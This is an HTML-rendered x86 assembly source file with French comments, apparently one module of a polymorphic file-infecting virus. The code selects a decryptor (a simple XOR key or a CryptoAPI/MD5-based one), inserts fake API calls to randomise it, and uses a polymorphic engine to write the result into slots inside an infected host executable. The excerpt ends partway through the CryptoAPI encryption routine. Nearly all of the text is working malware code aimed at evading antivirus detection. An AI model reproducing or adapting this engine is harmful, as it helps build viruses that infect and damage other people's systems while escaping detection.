<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>polymorphisation.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;MODULE : POLYMORPHISATION</span><span class="sc0">
</span><span class="sc1">;Ce module est chargé de choisir un décrypteur, le randomiser un peu (insertion de fake</span><span class="sc0">
</span><span class="sc1">;api calls) et d'appeler le poly engine dessus.</span><span class="sc0">



</span><span class="sc1">; apis de advapi32:</span><span class="sc0">
</span><span class="sc5">A32_CRYPTACQUIRECONTEXTA</span><span class="sc0">                                </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">A32_CRYPTCREATEHASH</span><span class="sc0">                                     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">A32_CRYPTHASHDATA</span><span class="sc0">                                       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">A32_CRYPTDERIVEKEY</span><span class="sc0">                                      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">A32_CRYPTDECRYPT</span><span class="sc0">                                        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">A32_CRYPTENCRYPT</span><span class="sc0">                                        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">




</span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">;POLY_CHOISIT_DECRYPTEUR : choisit un decrypteur</span><span class="sc0">
</span><span class="sc1">; in :</span><span class="sc0">
</span><span class="sc1">; out : variables poly_decrypteur, poly_nb_parties_decrypteur, fonction_encryption, poly_taille_pseudo_decrypteur, modifiées</span><span class="sc0">
</span><span class="sc5">poly_choisit_decrypteur</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PROB_DECRYPTEUR_SIMPLE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pcd_simple</span><span class="sc0">

</span><span class="sc5">pcd_cryptoapis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">encrypt_cryptoapis</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fonction_encryption</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pseudo_decrypteur_cryptoapis</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_decrypteur</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_a32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_name_dll</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apis_advapi_compatibles</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_liste_apis_compat</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_apis_compat</span><span class="sc4">],</span><span class="sc5">nb_apis_advapi_compatibles</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">],</span><span class="sc5">NB_PARTIES_DECRYPTEUR_INITIAL_CRYPTOAPIS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_ca_peheader</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pcd_fin</span><span class="sc0">
</span><span class="sc5">pcd_simple</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">encrypt_simple</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fonction_encryption</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pseudo_decrypteur_simple</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_decrypteur</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_name_dll</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">],</span><span class="sc5">NB_PARTIES_DECRYPTEUR_INITIAL_SIMPLE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_ca_peheader</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">simple_cle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">pcd_fin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">poly_choisit_decrypteur</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;POLY_PSEUDO_POLYMORPHIZE : Pseudo-polymorphize un décrypteur</span><span class="sc0">
</span><span class="sc1">;in : esi--&gt;pseudo-code du decrypteur</span><span class="sc0">
</span><span class="sc1">;     edi--&gt;buffer dispo</span><span class="sc0">
</span><span class="sc1">;     poly_nb_parties_decrypteur renseigné</span><span class="sc0">
</span><span class="sc1">;out: edi--&gt;buffer rempli avec le decrypteur pseudo-polymorphisé</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Ajoute les fake apis au décrypteur. Cette fonction trvaille sur du pseudo-code.</span><span class="sc0">
</span><span class="sc5">poly_pseudo_polymorphize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MAX_NB_PARTIES</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;edx=nb fake apis par ilot</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;pas touche au premier pseudo-opcode !!</span><span class="sc0">
</span><span class="sc5">psp_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">psp_fake_api</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">psp_insere_fake_api</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">psp_fake_api</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">psp_1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OP_FIN_DECRYPTEUR</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">psp_fin</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">psp_0</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">psp_1</span><span class="sc0">
</span><span class="sc5">psp_fin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">poly_pseudo_polymorphize</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;PSP_INSERE_FAKE_API : insere une fake api dans le decrypteur</span><span class="sc0">
</span><span class="sc1">; in : edi--&gt;endroit du décrypteur</span><span class="sc0">
</span><span class="sc1">; out: none</span><span class="sc0">
</span><span class="sc5">psp_insere_fake_api</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;choisit une fake_api</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_apis</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">taille_liste</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pifa_fin</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;esi-&gt; (future rva de l'api,nb args de l'api)</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pifa_fin</span><span class="sc0">

</span><span class="sc1">;genere le pseudo-code de l'ilot</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_random_pushs_api</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">;random_pushs_api</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_push_next_location</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">;random_pushs_api</span><span class="sc0">

</span><span class="sc1">;les pushs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">pifa_noargs</span><span class="sc0">
</span><span class="sc5">pifa_pushs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_random_push</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">pifa_pushs</span><span class="sc0">
</span><span class="sc5">pifa_noargs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_call_mem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">OP_call_mem_NB_ARGS</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">TYPE_ADRESSE</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_retour</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">;retour</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">;fin ilot</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pifa_fin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">psp_insere_fake_api</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;POLY_POLYMORPHISE : polymorphise le décrypteur et l'écrit dans les ilots</span><span class="sc0">
</span><span class="sc1">; in : esi-&gt;pseudo-code, ebx-&gt;hote filemappé, edx--&gt;PE header locations rempli</span><span class="sc0">
</span><span class="sc1">;out : ilots remplis</span><span class="sc0">
</span><span class="sc5">poly_polymorphise</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_appels</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nb_fake_pushs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">locations</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;adresses des ilots</span><span class="sc0">
</span><span class="sc5">pp_re</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_buffer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pp_boucle</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;separe l'api</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pp_fin_boucle</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OP_FIN_DECRYPTEUR</span><span class="sc0">   </span><span class="sc1">; fin ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pp_fin</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pp_boucle</span><span class="sc0">
</span><span class="sc5">pp_fin_boucle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OP_FIN_DECRYPTEUR</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;polymorphize</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;pseudo-opcodes à polymorphiser</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;edi--&gt;adresse physique de l'ilot</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ecx--&gt;adresse virtuelle de l'ilot</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">memoire</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_virus</span><span class="sc4">)+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">TAILLE_IMPORTS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infection_rva</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ebx=virtual adress de la mémoire</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">memoire</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;eax--&gt;memoire</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OPCODE_MAX_SIZE</span><span class="sc0">     </span><span class="sc1">;taille max du code généré par pseudo-opcode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">poly_asm</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;ilot suivant</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pp_re</span><span class="sc0">
</span><span class="sc5">pp_fin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">poly_polymorphise</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;============================== FONCTIONS D'ENCRYPTION ======================</span><span class="sc0">
</span><span class="sc1">;ENCRYPT_CRYPTOAPIS : encrypteur pour le decrypteur via cryptoapis</span><span class="sc0">
</span><span class="sc1">;  in  :   edx-&gt;pe header, ebx-&gt;file mapping,  edi--&gt;code to encrypt</span><span class="sc0">
</span><span class="sc1">;  out :   code to encrypt encrypted !</span><span class="sc0">
</span><span class="sc5">encrypt_cryptoapis</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CRYPT_VERIFYCONTEXT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PROV_RSA_FULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CAcquireContextA</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CALG_MD5</span><span class="sc0">
